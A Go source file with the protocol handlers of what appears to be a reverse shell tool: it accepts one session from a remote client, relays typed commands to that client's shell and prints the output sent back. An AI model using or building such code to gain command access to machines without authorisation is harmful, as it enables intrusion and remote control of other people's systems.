package protocol

import (
	"fmt"
	"os"
)

var isLock bool

func (c *Connection) onReverseShellConnectRequest(pdu *ReverseShellConnectREQUEST) {

	fmt.Printf("%s:(%s) starting shell.\n", pdu.clientAddress, pdu.hostname)

	c.clientAddress = pdu.clientAddress
	c.hostname = pdu.hostname

	responsePdu := &ReverseShellConnectResponse{
		status: !isLock,
	}
	c.active = responsePdu.status

	sendPdu(c.conn, responsePdu)

	isLock = true

	c.handleShellnput()
}

func (c *Connection) onReverseShellConnectRequestResponse(pdu *ReverseShellConnectResponse) {
	if !pdu.status {
		os.Exit(0)
	}

	go func() {
		for out := range c.output {
			sendPdu(c.conn, &ReverseShellOut{
				stdout: out,
			})
		}
	}()
	c.cmd.Outpout(c.output)
}

func (c *Connection) onReverseShellIn(pdu *ReverseShellIn) {
	c.cmd.Stdin.Write(pdu.stdin)
}

func (c *Connection) onReverseShellOut(pdu *ReverseShellOut) {
	fmt.Print(string(pdu.stdout))
}
func (c *Connection) onReverseShellExit(pdu *ReverseShellExit) {
	os.Exit(0)
}

func (c *Connection) handleShellnput() {
	go func() {
		for {
			select {
			case <-c.ctx.Done():
				return
			case input := <-c.provider.input:
				err := sendPdu(c.conn, &ReverseShellIn{
					stdin: []byte(input),
				})
				if err != nil {
					os.Exit(0)
				}
			}

		}
	}()

}
